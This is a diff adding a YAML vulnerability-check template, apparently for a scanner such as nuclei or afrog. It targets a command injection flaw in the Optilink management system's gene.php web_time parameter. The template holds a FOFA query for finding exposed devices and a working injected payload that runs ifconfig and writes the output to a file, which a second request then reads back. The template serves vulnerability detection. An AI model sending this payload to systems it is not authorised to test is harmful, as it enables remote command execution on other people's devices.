@@ -1,0 +1,20 @@
+id: poc-yaml-optilink-ms-web-name-command-injection
+info:
+  name: Optilink 管理系统 web_time 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: Optilink 管理系统
+  fofa: body="/html/css/dxtdata.css" && title="login"
+variables:
+  random: random_str(5)
+requests:
+- method: GET
+  path: /cgi/fsystem/gene.php?time=1&web_time=;ifconfig>%20{{.random}}.txt;%20%23%20
+  expression: status_code == 200 && contains(body,"Fatal error") && contains(body,"undefined
+    function") && contains(headers,"ifconfig")
+- method: GET
+  path: /cgi/fsystem/{{.random}}.txt
+  expression: status_code == 200 && contains(body,"Link encap:Ethernet") && contains(body,"HWaddr")
+    && contains(body,"Mask:")
+transport: http
